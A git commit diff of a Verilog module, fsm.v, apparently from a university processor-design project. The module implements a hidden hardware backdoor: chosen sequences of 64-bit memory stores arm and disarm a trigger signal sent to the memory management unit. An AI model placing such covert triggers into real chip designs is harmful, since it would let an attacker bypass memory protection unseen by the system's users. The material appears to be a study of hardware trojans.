c1e9c3448ecb58d648c710beb206a611e3c48648
Tien-Hao Gan <tienhao@caen-vnc04.engin.umich.edu>
2013-11-17 15:39:11 -0500

    upload fsm.v tienhao

--- vsimple_f13/verilog/fsm.v
+++ vsimple_f13/verilog/fsm.v
@@ -1,13 +1,15 @@
-`define DOOR1  64'h123f45a6f8e2b6c4
-`define DOOR2  64'h87383c7a1b8e3c21
-`define DOOR3  64'h00001111cccc1111
-`define DOOR4  64'hffffffff0000ffff
-`define DOOR5  64'h0101fafa0101fafa
-`define DOOR6  64'h13579abcde246810
-`define DOOR7  64'h13487abacdd45487
-`define DOOR8  64'h0011001100110011
-`define DOOR9  64'h1100110011001100
-`define DOOR10 64'hffaaffbbffccffdd
+//`define DOOR1  64'h123f45a6f8e2b6c4
+//`define DOOR2  64'h87383c7a1b8e3c21
+//`define DOOR3  64'h00001111cccc1111
+//`define DOOR4  64'hffffffff0000ffff
+//`define DOOR5  64'h0101fafa0101fafa
+//`define DOOR6  64'h13579abcde246810
+//`define DOOR7  64'h13487abacdd45487
+//`define CLOSE_DOOR1  64'h0011001100110011
+//`define CLOSE_DOOR2  64'h1100110011001100
+//`define CLOSE_DOOR3  64'hffaaffbbffccffdd
+
+`timescale 1ns/100ps
 
 module fsm(
         //INPUT
@@ -33,11 +35,14 @@ wire backdoor_untrig;
 
 reg backdoor;
 reg [2:0] trigState;
+reg [2:0] trigState_n;
 reg [1:0] untrigState;
+reg [1:0] untrigState_n;
 
+
+assign fsm_mmu_backdoor_trig = (backdoor) ? 1'b1 : 1'b0; 
 assign backdoor_trig   = (trigState == 3'b111) ? 1'b1 : 1'b0;
 assign backdoor_untrig = (untrigState == 2'b11)  ? 1'b1 : 1'b0;
-
 
 always@(*)
 begin
@@ -105,21 +110,14 @@ begin
                     else
                         trigState_n = 3'b000;     
                 end
-            3'b111:
-                begin
-                        trigState_n = 3'b000;     
-                end
-            default:
-                        trigState_n = 3'b000;
+            3'b111: trigState_n = 3'b000;     
+            default: trigState_n = 3'b000;
         endcase
     end else
-    begin
         trigState_n = trigState;
-    end
 end
 
-
-always@(posedge clk)
+always@(posedge clock)
 begin
     if(reset)
         trigState <= `SD 'd0;
@@ -127,10 +125,65 @@ begin
         trigState <= `SD trigState_n;
 end
 
-always@(posedge clk)
+always@(*)
+begin
+    if(backdoor == 1'b1)
+    begin
+        if(proc2Dmem_command == `BUS_STORE )
+        begin
+            case(untrigState[1:0])
+                2'b00:
+                    begin
+                        if(proc2Dmem_data == `CLOSE_DOOR1)
+                            untrigState_n = 2'b01;
+                        else
+                            untrigState_n = 2'b00;     
+                    end
+                2'b01:
+                    begin
+                        if(proc2Dmem_data == `CLOSE_DOOR2)
+                            untrigState_n = 2'b10;
+                        else if(proc2Dmem_data == `CLOSE_DOOR1)
+                            untrigState_n = 2'b01;
+                        else
+                            untrigState_n = 2'b00;     
+                    end
+                2'b10:
+                    begin
+                        if(proc2Dmem_data == `CLOSE_DOOR3)
+                            untrigState_n = 2'b11;
+                        else if(proc2Dmem_data == `CLOSE_DOOR1)
+                            untrigState_n = 2'b01;
+                        else
+                            untrigState_n = 2'b00;     
+                    end
+                2'b11: untrigState_n = 2'b00;
+                default: untrigState_n = 2'b00;
+            endcase
+        end else // end if(proc2Dmem_command == `BUS_STORE )
+            untrigState_n = untrigState;
+    end else // end if(backdoor == 1'b1)
+        untrigState_n = 2'b00;
+end // end always@(*)
+
+always@(posedge clock)
 begin
     if(reset)
         untrigState <= `SD 'd0;
     else
-        untrigState <= `SD trigState_n;
+        untrigState <= `SD untrigState_n;
 end
+
+always@(posedge clock)
+begin
+    if(reset)
+        backdoor <= `SD 1'b0;
+    else
+    begin
+        if(backdoor_trig) backdoor <= `SD 1'b1;
+        else if(backdoor_untrig) backdoor <= `SD 1'b0;
+    end
+end
+
+
+endmodule
